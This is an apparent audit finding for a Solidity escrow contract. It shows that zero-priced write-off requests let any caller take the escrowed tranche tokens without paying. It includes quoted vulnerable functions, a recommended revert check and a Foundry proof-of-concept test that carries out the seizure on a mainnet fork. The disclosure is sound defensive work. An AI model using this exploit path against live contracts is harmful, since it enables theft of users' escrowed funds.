### Title
Zero-priced write-off requests let any fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow` accepts a write-off request with a non-zero tranche amount but zero requested underlying. Once escrowed, any unprivileged fulfiller can reference the victim address, pass `_underlyings == 0`, satisfy the underpayment check, delete the request, and receive all escrowed tranche tokens without paying the victim. [1](#0-0) [2](#0-1) 

### Finding Description
`createWriteOffRequest` checks only that `amount != 0`; it does not validate that `underlyingsRequested` is non-zero. The request is then stored under `userRequests[msg.sender]` and the tranche tokens are transferred into escrow. [1](#0-0) 

`fullfillWriteOffRequest` is intentionally callable by any wallet and resolves a request solely from the supplied `_user` object reference. Its price check is `_underlyings < currentRequest.underlyings`, so a stored `underlyings == 0` is satisfied by paying zero underlying. The function then deletes the victim's request and transfers `currentRequest.tranches` to the fulfiller. [3](#0-2) [4](#0-3) 

This violates the one-receipt-one-payout and escrow-settlement invariants: a request must only be settled by paying its economically meaningful consideration, and a zero-price order must not create a permissionless claim over the escrowed collateral. [2](#0-1) 

### Impact Explanation
A zero-priced request results in direct theft of the full escrowed tranche amount. For example, a lender escrowing `10_000e18` AA tranche tokens while accidentally requesting `0` underlying can lose all `10_000e18` tranche tokens to the first fulfiller, who pays only transaction fees. [5](#0-4) [4](#0-3) 

### Likelihood Explanation
Exploitation requires a victim to create a zero-underlying request, so it is conditional on that malformed request existing. Once created, exploitation is immediate: `userRequests` is public, fulfillment is permissionless, the attacker only needs to pass the victim's address and stored tranche amount, and no epoch-running check or privileged call is required in `fullfillWriteOffRequest`. [6](#0-5) [7](#0-6) 

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest` unless zero-priced write-offs are an explicitly supported donation mechanism. If such requests must be supported, consider restricting zero-priced fulfillment or requiring an additional requester-signed action; otherwise the simple `if (underlyingsRequested == 0) revert NotAllowed();` check preserves normal settlement while removing the free-claim path. [8](#0-7) 

### Proof of Concept
The following test can be added to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`; it uses the existing mainnet-fork `setUp`, where `LP` is an AA-tranche holder that already approved the escrow. [9](#0-8) 

```solidity
function testPocZeroAskRequestLetsAnyoneSeizeTranches() external {
    uint256 stolenTranches = 10_000e18;
    address attacker = makeAddr("attacker");

    // LP creates a malformed write-off request during a running epoch.
    vm.prank(LP);
    escrow.createWriteOffRequest(stolenTranches, 0);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, stolenTranches, "tranches were not escrowed");
    assertEq(underlyings, 0, "test requires a zero-priced request");
    assertEq(escrow.pendingUnderlyings(), 0, "zero-priced request added pending debt");

    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);
    uint256 lpUnderlyingPre = underlying.balanceOf(LP);

    // Any unprivileged fulfiller resolves another user's request for free.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, stolenTranches, 0);

    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, stolenTranches, "attacker did not receive escrowed tranches");
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingPre, "attacker paid underlying");
    assertEq(underlying.balanceOf(LP), lpUnderlyingPre, "victim received payment");

    (tranches, underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 0, "victim request was not deleted");
    assertEq(underlyings, 0, "victim request was not fully cleared");
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
